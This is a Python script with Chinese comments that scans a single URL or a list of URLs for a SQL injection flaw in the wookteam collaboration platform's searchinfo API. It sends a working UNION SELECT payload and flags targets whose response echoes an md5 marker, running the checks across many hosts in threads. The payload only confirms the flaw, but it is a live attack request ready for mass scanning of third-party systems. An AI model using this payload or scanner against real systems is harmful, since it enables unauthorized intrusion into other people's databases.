import requests
import argparse
import threading
import sys


def Wook(url, result):
    create_url = url + "/api/users/searchinfo?where%5Busername%5D=1%27%29%20UNION%20ALL%20SELECT%20NULL,CONCAT%280x7e,md5%281%29,0x7e%29,NULL,NULL,NULL%23"
    # 请求URL中存在SQL注入语句


    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 5.1;rv:5.0) Gecko/20100101 Firefox/5.0 info",
               "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "zh-CN,zh;q=0.9",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7"
               }

    try:
        req = requests.get(create_url, headers=headers, timeout=5)
        # print(req.text)
        # 测试响应包中返回的数据
        if (req.status_code == 200):
            if "~c4ca4238a0b923820dcc509a6f75849b~" in req.text:
                print(f"【+】{url}存在相关SQL注入漏洞")
                result.append(url)
            else:
                print(f"【-】{url}不存在相关SQL注入漏洞")
    except:
        print(f"【-】{url}无法访问或网络连接错误")


def Wook_counts(filename):
    result = []
    try:
        with open(filename, "r") as file:
            urls = file.readlines()
            threads = []
            for url in urls:
                url = url.strip()
                thread = threading.Thread(target=Wook, args=(url, result))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
        else:
            print("\n未发现任何存在SQL注入漏洞的URL。")
    except Exception as e:
        print(f"发生错误: {str(e)}")


def start():
    logo = '''
__/\\\______________/\\\___________________________________________        
 _\/\\\_____________\/\\\______________________________/\\\_________       
  _\/\\\_____________\/\\\_____________________________\/\\\_________      
   _\//\\\____/\\\____/\\\______/\\\\\________/\\\\\____\/\\\\\\\\____     
    __\//\\\__/\\\\\__/\\\_____/\\\///\\\____/\\\///\\\__\/\\\////\\\__    
     ___\//\\\/\\\/\\\/\\\_____/\\\__\//\\\__/\\\__\//\\\_\/\\\\\\\\/___   
      ____\//\\\\\\//\\\\\_____\//\\\__/\\\__\//\\\__/\\\__\/\\\///\\\___  
       _____\//\\\__\//\\\_______\///\\\\\/____\///\\\\\/___\/\\\_\///\\\_ 
        ______\///____\///__________\/////________\/////_____\///____\///__

'''
    print(logo)
    print("脚本由 YZX100 编写")


def main():
    parser = argparse.ArgumentParser(description="wookteam协作平台searchinfo接口SQL注入漏洞检测脚本")
    parser.add_argument('-u', type=str, help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        result = []
        Wook(args.u, result)
        if result:
            print("\n存在SQL注入漏洞的URL如下：")
            for vulnerable_url in result:
                print(vulnerable_url)
    elif args.f:
        Wook_counts(args.f)
    else:
        parser.print_help()


if __name__ == "__main__":
    start()
    main()